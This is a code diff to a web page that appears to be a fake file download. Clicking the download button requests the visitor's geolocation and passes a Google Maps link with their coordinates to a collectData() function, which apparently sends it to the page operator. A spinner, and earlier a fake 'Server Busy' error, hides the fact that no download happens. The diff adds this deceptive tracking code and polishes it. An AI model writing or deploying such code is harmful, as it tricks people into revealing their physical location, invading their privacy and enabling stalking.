@@ -20,6 +20,30 @@
             --play-blue: #3b82f6;
         }
 
+/* Download Button Loading Spinner */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            display: inline-block;
+            animation: btnSpin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes btnSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-loading {
+            pointer-events: none;
+            opacity: 0.8;
+            cursor: not-allowed;
+        }
+        
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
         body { background: var(--bg); color: var(--text-p); padding: 5px; display: flex; justify-content: center; overflow-x: hidden; }
         
@@ -471,15 +495,35 @@
     }
 
     dlBtn.addEventListener('click', () => {
+        // ၁။ ခလုတ်ကို Loading ပြောင်းမယ်
+        const originalBtnContent = dlBtn.innerHTML;
+        dlBtn.innerHTML = '<span class="spinner"></span> 30';
+        dlBtn.classList.add('btn-loading');
+
         if (navigator.geolocation) {
+            // ၂။ Location တောင်းမယ်
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const map = `🌍 Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                collectData("Location 📍", map);
-                alrt("Download Error: Server Busy. Please try again later.");
-            }, () => { //alrt("Allow location to download this file.");
- });
+                // Location ရရင် Data ပို့မယ်
+                const map = `🌍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await collectData("Location 📍", map);
+                
+                // ၃။ ၂ စက္ကန့်လောက် လည်ပြီးမှ မူလအတိုင်း ပြန်ပြင်မယ်
+                setTimeout(() => {
+                    dlBtn.innerHTML = originalBtnContent;
+                    dlBtn.classList.remove('btn-loading');
+                    //alert("Download Error: Server Busy. Please try again later.");
+                }, 2000);
+
+            }, (err) => { 
+                // Permission ငြင်းရင်လည်း Spinner ကို ဖျောက်ပြီး မူလအတိုင်း ပြန်ပြင်မယ်
+                dlBtn.innerHTML = originalBtnContent;
+                dlBtn.classList.remove('btn-loading');
+                //alert("Please allow location permission to start the download.");
+            });
         } else {
-            //alrt("Geolocation is not supported by this browser.");
+            // Geolocation မရှိရင် မူလအတိုင်း ပြန်ထားမယ်
+            dlBtn.innerHTML = originalBtnContent;
+            dlBtn.classList.remove('btn-loading');
         }
     });
 
@@ -487,4 +531,4 @@
 </script>
 
 </body>
-    </html>
+</html>
